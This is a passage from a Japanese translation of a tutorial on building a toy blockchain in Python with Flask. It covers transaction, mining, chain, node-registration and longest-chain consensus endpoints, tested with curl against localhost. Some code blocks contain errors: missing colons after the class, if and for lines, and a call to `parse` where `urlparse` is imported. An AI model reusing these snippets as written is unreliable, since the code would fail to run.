<span class="c1"># Flaskについて詳しくはこちらを読んでほしい http://flask.pocoo.org/docs/0.12/quickstart/#a-minimal-application</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="c1"># このノードのグローバルにユニークなアドレスを作る</span>
<span class="n">node_identifire</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'-'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>

<span class="c1"># ブロックチェーンクラスをインスタンス化する</span>
<span class="n">blockchain</span> <span class="o">=</span> <span class="n">Blockchain</span><span class="p">()</span>

<span class="c1"># メソッドはPOSTで/transactions/newエンドポイントを作る。メソッドはPOSTなのでデータを送信する</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/transactions/new'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">new_transactions</span><span class="p">():</span>
    <span class="k">return</span> <span class="s1">'新しいトランザクションを追加します'</span>

<span class="c1"># メソッドはGETで/mineエンドポイントを作る</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/mine'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">mine</span><span class="p">():</span>
    <span class="k">return</span> <span class="s1">'新しいブロックを採掘します'</span>

<span class="c1"># メソッドはGETで、フルのブロックチェーンをリターンする/chainエンドポイントを作る</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/chain'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">full_chain</span><span class="p">():</span>
    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'chain'</span><span class="p">:</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">chain</span><span class="p">,</span>
        <span class="s1">'length'</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">blockchain</span><span class="o">.</span><span class="n">chain</span><span class="p">),</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">response</span><span class="p">),</span> <span class="mi">200</span>

<span class="c1"># port5000でサーバーを起動する</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</pre></div>
</div>

<h2>
<span id="トランザクションエンドポイント" class="fragment"></span><a href="#%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%A8%E3%83%B3%E3%83%89%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>トランザクションエンドポイント</h2>

<p>これらトランザクションのリクエストの例だ。このようなものをユーザーはサーバーに送る:</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>{
 "sender": "my address",
 "recipient": "someone else's address",
 "amount": 5
}
</pre></div></div>

<p>すでにブロックにトランザクションを加えるメソッドは作ってあるため、残りは簡単だ。トランザクションを加えるためのメソッドを書いていこう。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>

<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">textwrap</span> <span class="kn">import</span> <span class="n">dedent</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">uuid4</span>

<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">request</span>

<span class="o">...</span>


<span class="c1"># メソッドはPOSTで/transactions/newエンドポイントを作る。メソッドはPOSTなのでデータを送信する</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/transactions/new'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">new_transaction</span><span class="p">():</span>
    <span class="n">values</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>

    <span class="c1"># POSTされたデータに必要なデータがあるかを確認</span>
    <span class="n">required</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'sender'</span><span class="p">,</span> <span class="s1">'recipient'</span><span class="p">,</span> <span class="s1">'amount'</span><span class="p">]</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nb">all</span><span class="p">(</span><span class="n">k</span> <span class="ow">in</span> <span class="n">values</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">required</span><span class="p">):</span>
        <span class="k">return</span> <span class="s1">'Missing values'</span><span class="p">,</span> <span class="mi">400</span>

    <span class="c1"># 新しいトランザクションを作る</span>
    <span class="n">index</span> <span class="o">=</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">new_transaction</span><span class="p">(</span><span class="n">values</span><span class="p">[</span><span class="s1">'sender'</span><span class="p">],</span> <span class="n">values</span><span class="p">[</span><span class="s1">'recipient'</span><span class="p">],</span> <span class="n">values</span><span class="p">[</span><span class="s1">'amount'</span><span class="p">])</span>

    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'message'</span><span class="p">:</span> <span class="n">f</span><span class="s1">'トランザクションはブロック {index} に追加されました'</span><span class="p">}</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">response</span><span class="p">),</span> <span class="mi">201</span>
</pre></div>
</div>

<h2>
<span id="採掘のエンドポイント" class="fragment"></span><a href="#%E6%8E%A1%E6%8E%98%E3%81%AE%E3%82%A8%E3%83%B3%E3%83%89%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>採掘のエンドポイント</h2>

<p>採掘のエンドポイントは魔法が起きるところだが、簡単だ。3つのことを行う必要がある。<br>
1. プルーフ・オブ・ワークを計算する<br>
2. 1コインを採掘者に与えるトランザクションを加えることで、採掘者（この場合は我々）に利益を与える<br>
3. チェーンに新しいブロックを加えることで、新しいブロックを採掘する</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>

<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">textwrap</span> <span class="kn">import</span> <span class="n">dedent</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">uuid4</span>

<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">request</span>

<span class="o">...</span>


<span class="c1"># メソッドはGETで/mineエンドポイントを作る</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/mine'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">mine</span><span class="p">():</span>
    <span class="c1"># 次のプルーフを見つけるためプルーフ・オブ・ワークアルゴリズムを使用する</span>
    <span class="n">last_block</span> <span class="o">=</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">last_block</span>
    <span class="n">last_proof</span> <span class="o">=</span> <span class="n">last_block</span><span class="p">[</span><span class="s1">'proof'</span><span class="p">]</span>
    <span class="n">proof</span> <span class="o">=</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">proof_of_work</span><span class="p">(</span><span class="n">last_proof</span><span class="p">)</span>

    <span class="c1"># プルーフを見つけたことに対する報酬を得る</span>
    <span class="c1"># 送信者は、採掘者が新しいコインを採掘したことを表すために"0"とする</span>
    <span class="n">blockchain</span><span class="o">.</span><span class="n">new_transaction</span><span class="p">(</span>
        <span class="n">sender</span><span class="o">=</span><span class="s2">"0"</span><span class="p">,</span>
        <span class="n">recipient</span><span class="o">=</span><span class="n">node_identifire</span><span class="p">,</span>
        <span class="n">amount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
    <span class="p">)</span>

    <span class="c1"># チェーンに新しいブロックを加えることで、新しいブロックを採掘する</span>
    <span class="n">block</span> <span class="o">=</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">new_block</span><span class="p">(</span><span class="n">proof</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'message'</span><span class="p">:</span> <span class="s1">'新しいブロックを採掘しました'</span><span class="p">,</span>
        <span class="s1">'index'</span><span class="p">:</span> <span class="n">block</span><span class="p">[</span><span class="s1">'index'</span><span class="p">],</span>
        <span class="s1">'transactions'</span><span class="p">:</span> <span class="n">block</span><span class="p">[</span><span class="s1">'transactions'</span><span class="p">],</span>
        <span class="s1">'proof'</span><span class="p">:</span> <span class="n">block</span><span class="p">[</span><span class="s1">'proof'</span><span class="p">],</span>
        <span class="s1">'previous_hash'</span><span class="p">:</span> <span class="n">block</span><span class="p">[</span><span class="s1">'previous_hash'</span><span class="p">],</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">response</span><span class="p">),</span> <span class="mi">200</span>
</pre></div>
</div>

<p>採掘されたブロックに含まれるトランザクションの受信者のアドレスは、自分のノードのアドレスであることに注意してほしい。そして、ここで行っていることの殆どは、ブロックチェーンクラスとのインタラクションにすぎない。一旦ここまでにして、このブロックチェーンとのインタラクションを始めよう。</p>

<h1>
<span id="ステップ3-オリジナルブロックチェーンとのインタラクション" class="fragment"></span><a href="#%E3%82%B9%E3%83%86%E3%83%83%E3%83%973-%E3%82%AA%E3%83%AA%E3%82%B8%E3%83%8A%E3%83%AB%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%83%81%E3%82%A7%E3%83%BC%E3%83%B3%E3%81%A8%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%A9%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>ステップ3: オリジナルブロックチェーンとのインタラクション</h1>

<p>cURLかPostmanを使ってAPIを叩いてみよう</p>

<p>サーバーを起動する:</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ python blockchain.py
* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
</pre></div></div>

<p><code>http://localhost:5000/mine</code>への<code>GET</code>リクエストを作って採掘しよう</p>

<p><a href="https://camo.qiitausercontent.com/6362bb20a4a2a1e6d1fc55c66e319288dbea75a9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f38373738666265392d343034652d383139622d316465352d3263376531373436653730352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6362bb20a4a2a1e6d1fc55c66e319288dbea75a9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f38373738666265392d343034652d383139622d316465352d3263376531373436653730352e706e67" alt="blockchain_mining.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/68213/8778fbe9-404e-819b-1de5-2c7e1746e705.png"></a></p>

<p><code>http://localhost:5000/transactions/new</code>への<code>POST</code>リクエストを作って新しいトランザクションを作ろう。ボディに取引の内容を入れておく。</p>

<p><a href="https://camo.qiitausercontent.com/6aa5bc7b15fbba7fd63d79528bfdfe93e2401d27/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f63336265633166312d356136652d316632332d376134382d3535633539666163626163662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6aa5bc7b15fbba7fd63d79528bfdfe93e2401d27/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f63336265633166312d356136652d316632332d376134382d3535633539666163626163662e706e67" alt="blockchain_transaction.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/68213/c3bec1f1-5a6e-1f23-7a48-55c59facbacf.png"></a></p>

<p>もしPostmanを使っていない場合、cURLを使っても同じことが出来る。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ curl -X POST -H "Content-Type: application/json" -d '{
 "sender": "d4ee26eee15148ee92c6cd394edd974e",
 "recipient": "someone-other-address",
 "amount": 5
}' "http://localhost:5000/transactions/new"
</pre></div></div>

<p>サーバーを再起動して、2ブロックを採掘した、つまりトータル3ブロックだ。ここでチェーン全体を<code>http://localhost:5000/chain</code>をリクエストすることで見てみよう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>{
  "chain": [
    {
      "index": 1,
      "previous_hash": 1,
      "proof": 100,
      "timestamp": 1506280650.770839,
      "transactions": []
    },
    {
      "index": 2,
      "previous_hash": "c099bc...bfb7",
      "proof": 35293,
      "timestamp": 1506280664.717925,
      "transactions": [
        {
          "amount": 1,
          "recipient": "8bbcb347e0634905b0cac7955bae152b",
          "sender": "0"
        }
      ]
    },
    {
      "index": 3,
      "previous_hash": "eff91a...10f2",
      "proof": 35089,
      "timestamp": 1506280666.1086972,
      "transactions": [
        {
          "amount": 1,
          "recipient": "8bbcb347e0634905b0cac7955bae152b",
          "sender": "0"
        }
      ]
    }
  ],
  "length": 3
}
</pre></div></div>

<h1>
<span id="ステップ4-コンセンサス" class="fragment"></span><a href="#%E3%82%B9%E3%83%86%E3%83%83%E3%83%974-%E3%82%B3%E3%83%B3%E3%82%BB%E3%83%B3%E3%82%B5%E3%82%B9"><i class="fa fa-link"></i></a>ステップ4: コンセンサス</h1>

<p>これはクールだ。トランザクションを受け付けて、新しいブロックを採掘できるブロックチェーンを作ることが出来た。しかしブロックチェーンの重要なポイントは、非中央集権的であることだ。そしてもし非中央集権的であれば、我々はどのように地球上の全員が同じチェーンを反映していると確認することが出来るだろうか。これは<em>コンセンサス</em>の問題と呼ばれており、もし1つより多くのノードをネットワーク上に持ちたければ、コンセンサスのアルゴリズムを実装しなければならない。</p>

<h2>
<span id="新しいノードを登録する" class="fragment"></span><a href="#%E6%96%B0%E3%81%97%E3%81%84%E3%83%8E%E3%83%BC%E3%83%89%E3%82%92%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>新しいノードを登録する</h2>

<p>コンセンサスアルゴリズムを実装する前に、ネットワーク上にある他のノードを知る方法を作ろう。それぞれのノードがネットワーク上の他のノードのリストを持っていなければならない。なのでいくつかのエンドポイントが追加で必要となる。</p>

<ol>
<li>URLの形での新しいノードのリストを受け取るための<code>/nodes/register</code>
</li>
<li>あらゆるコンフリクトを解消することで、ノードが正しいチェーンを持っていることを確認するための<code>/nodes/resolve</code>
</li>
</ol>

<p>これから、我々のブロックチェーンの構造を編集し、ノード登録のためのメソッドを追加する:</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="o">...</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
<span class="o">...</span>


<span class="k">class</span> <span class="nc">Blockchain</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="o">...</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">nodes</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
        <span class="o">...</span>

    <span class="k">def</span> <span class="nf">register_node</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        ノードリストに新しいノードを加える</span>
<span class="sd">        :param address: &lt;str&gt; ノードのアドレス 例: 'http://192.168.0.5:5000'</span>
<span class="sd">        :return: None</span>
<span class="sd">        """</span>

        <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">nodes</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">parsed_url</span><span class="o">.</span><span class="n">netloc</span><span class="p">)</span>
</pre></div>
</div>

<p>ノードのリストを保持するのに<code>set()</code>を使ったことに注意してほしい。これは、新しいノードの追加がべき等 -同じノードを何回加えても、一度しか現れない-　ということを実現するための簡単な方法だ。</p>

<h2>
<span id="コンセンサスアルゴリズムを実装する" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%82%BB%E3%83%B3%E3%82%B5%E3%82%B9%E3%82%A2%E3%83%AB%E3%82%B4%E3%83%AA%E3%82%BA%E3%83%A0%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>コンセンサスアルゴリズムを実装する</h2>

<p>以前言及したとおり、コンフリクトはあるノードが他のノードと異なったチェーンを持っているときに発生する。これを解決するために、<em>最も長いチェーンが信頼できる</em>というルールを作る。別の言葉で言うと、ネットワーク上で最も長いチェーンは<em>事実上正しい</em>ものといえる。このアルゴリズムを使って、ネットワーク上のノード間でコンセンサスに到達する。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="o">...</span>
<span class="kn">import</span> <span class="nn">requests</span>


<span class="k">class</span> <span class="nc">Blockchain</span><span class="p">(</span><span class="nb">object</span><span class="p">)</span>
    <span class="o">...</span>

    <span class="k">def</span> <span class="nf">valid_chain</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">chain</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        ブロックチェーンが正しいかを確認する</span>

<span class="sd">        :param chain: &lt;list&gt; ブロックチェーン</span>
<span class="sd">        :return: &lt;bool&gt; True であれば正しく、 False であればそうではない</span>
<span class="sd">        """</span>

        <span class="n">last_block</span> <span class="o">=</span> <span class="n">chain</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">current_index</span> <span class="o">=</span> <span class="mi">1</span>

        <span class="k">while</span> <span class="n">current_index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">chain</span><span class="p">):</span>
            <span class="n">block</span> <span class="o">=</span> <span class="n">chain</span><span class="p">[</span><span class="n">current_index</span><span class="p">]</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'{last_block}'</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'{block}'</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">--------------</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>

            <span class="c1"># ブロックのハッシュが正しいかを確認</span>
            <span class="k">if</span> <span class="n">block</span><span class="p">[</span><span class="s1">'previous_hash'</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hash</span><span class="p">(</span><span class="n">last_block</span><span class="p">)</span>
                <span class="k">return</span> <span class="bp">False</span>

            <span class="c1"># プルーフ・オブ・ワークが正しいかを確認</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">valid_proof</span><span class="p">(</span><span class="n">last_block</span><span class="p">[</span><span class="s1">'proof'</span><span class="p">],</span> <span class="n">block</span><span class="p">[</span><span class="s1">'proof'</span><span class="p">])</span>
                <span class="k">return</span> <span class="bp">False</span>

            <span class="n">last_block</span> <span class="o">=</span> <span class="n">block</span>
            <span class="n">current_index</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">return</span> <span class="bp">True</span>

    <span class="k">def</span> <span class="nf">resolve_conflicts</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        これがコンセンサスアルゴリズムだ。ネットワーク上の最も長いチェーンで自らのチェーンを</span>
<span class="sd">        置き換えることでコンフリクトを解消する。</span>
<span class="sd">        :return: &lt;bool&gt; 自らのチェーンが置き換えられると True 、そうでなれけば False</span>
<span class="sd">        """</span>

        <span class="n">neighbours</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">nodes</span>
        <span class="n">new_chain</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="c1"># 自らのチェーンより長いチェーンを探す必要がある</span>
        <span class="n">max_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">chain</span><span class="p">)</span>

        <span class="c1"># 他のすべてのノードのチェーンを確認</span>
        <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">neighbours</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">f</span><span class="s1">'http://{node}/chain'</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
                <span class="n">length</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'length'</span><span class="p">]</span>
                <span class="n">chain</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'chain'</span><span class="p">]</span>

                <span class="c1"># そのチェーンがより長いか、有効かを確認</span>
                <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;</span> <span class="n">max_length</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">valid_chain</span><span class="p">(</span><span class="n">chain</span><span class="p">):</span>
                    <span class="n">max_length</span> <span class="o">=</span> <span class="n">length</span>
                    <span class="n">new_chain</span> <span class="o">=</span> <span class="n">chain</span>

        <span class="c1"># もし自らのチェーンより長く、かつ有効なチェーンを見つけた場合それで置き換える</span>
        <span class="k">if</span> <span class="n">new_chain</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">chain</span> <span class="o">=</span> <span class="n">new_chain</span>
            <span class="k">return</span> <span class="bp">True</span>

        <span class="k">return</span> <span class="bp">False</span>
</pre></div>
</div>

<p>この最初のメソッド<code>valid_chain()</code>は、チェーンの中の全てのブロックに対してハッシュとプルーフが正しいかを確認することで、チェーンが有効かどうかの判定を行っている。</p>

<p><code>resolve_conflicts()</code>メソッドは、全てのネットワーク上のノードに対して、それらのチェーンをダウンロードし、上記のメソッドを使うことで確認している。<em>もし有効なチェーンで自らのチェーンよりも長いものがあった場合、それで自らのチェーンを入れ替える。</em></p>

<p>次に2つのエンドポイントをAPIに追加しよう。1つはネットワーク上に他のノードを追加するため、もう1つはコンフリクトを解消するためのものだ。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="o">...</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/nodes/register'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register_node</span><span class="p">():</span>
    <span class="n">values</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>

    <span class="n">nodes</span> <span class="o">=</span> <span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'nodes'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">nodes</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="s2">"Error: 有効ではないノードのリストです"</span><span class="p">,</span> <span class="mi">400</span>

    <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">nodes</span><span class="p">:</span>
        <span class="n">blockchain</span><span class="o">.</span><span class="n">register_node</span><span class="p">(</span><span class="n">node</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'message'</span><span class="p">:</span> <span class="s1">'新しいノードが追加されました'</span><span class="p">,</span>
        <span class="s1">'total_nodes'</span><span class="p">:</span> <span class="nb">list</span><span class="p">(</span><span class="n">blockchain</span><span class="o">.</span><span class="n">nodes</span><span class="p">),</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">response</span><span class="p">),</span> <span class="mi">201</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/nodes/resolve'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">consensus</span><span class="p">():</span>
    <span class="n">replaced</span> <span class="o">=</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">resolve_conflicts</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">replaced</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">'message'</span><span class="p">:</span> <span class="s1">'チェーンが置き換えられました'</span><span class="p">,</span>
            <span class="s1">'new_chain'</span><span class="p">:</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">chain</span>
        <span class="p">}</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">'message'</span><span class="p">:</span> <span class="s1">'チェーンが確認されました'</span><span class="p">,</span>
            <span class="s1">'chain'</span><span class="p">:</span> <span class="n">blockchain</span><span class="o">.</span><span class="n">chain</span>
        <span class="p">}</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">response</span><span class="p">),</span> <span class="mi">200</span>
<span class="o">...</span>
</pre></div>
</div>

<p>ここで、もう1つのマシンがあればそれを使って（訳注：複数マシン間でどのようにアクセスするのかは不明。ngork使うとか？）別のノードを立ち上げる。または、同じマシンで違うポートから別のノードを立ち上げる。すなわち、<code>http://localhost:5000</code>と<code>http://localhost:5001</code>という2つのノードが出来る。</p>

<p>まず、　新しいノードを登録する。</p>

<p>訳注:ターミナルでcurlコマンドで日本語を表示するとユニコードエスケープで表示されてしまいます。その際は、<a href="https://stedolan.github.io/jq/" rel="nofollow noopener" target="_blank">jq</a>をインストールして（macでHomebrewを使っていれば<code>brew install jq</code>で出来ます）、コマンドの後ろに<code>| jq</code>を加えるとデコードされて表示されます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ curl -X POST -H "Content-Type: application/json" -d '{
    "nodes": ["http://localhost:5001"]
}' "http://localhost:5000/nodes/register"
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/8e10dcfbba489ecfa330adf0c6e48361bacb43a7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f64313734616639312d666435382d376338612d346336382d3331346633336134633463312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8e10dcfbba489ecfa330adf0c6e48361bacb43a7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f64313734616639312d666435382d376338612d346336382d3331346633336134633463312e706e67" alt="blockchain_register.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/68213/d174af91-fd58-7c8a-4c68-314f33a4c4c1.png"></a></p>

<p>そしてノード2のチェーンが長くなるように、いくつか新しいブロックをノード2で採掘する。その後、ノード1で<code>GET /nodes/resolve</code>を行い、コンセンサスアルゴリズムによりチェーンを置き換える。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ curl "http://localhost:5001/mine"
$ curl "http://localhost:5000/nodes/resolve"
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/a05f723ea2ca617f763c92fff5660db43a1f6829/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f38313035313336382d616139392d346232642d363535622d3661623339366536363465322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a05f723ea2ca617f763c92fff5660db43a1f6829/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36383231332f38313035313336382d616139392d346232642d363535622d3661623339366536363465322e706e67" alt="blockchain_consensus.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/68213/81051368-aa99-4b2d-655b-6ab396e664e2.png"></a></p>

<p>これでおしまいだ。友達と我々のブロックチェーンを試してみてほしい。</p>

<hr>

<p>これがあなたを何か新しいものを作るよう奮い立たせるよう願っている。ブロックチェーンが、我々の経済・政府・記録の保管への考え方を急速に変えていくと信じているので、私は暗号通貨に対して非常に興奮している。</p>

<p><strong>アップデート</strong>: これの続きとなるパート2を計画中だ。そこでは、トランザクションを確認するメカニズムと、このブロックチェーンを実際に使えるようにするためのいくつかの方法についての議論を追加する予定だ。</p>

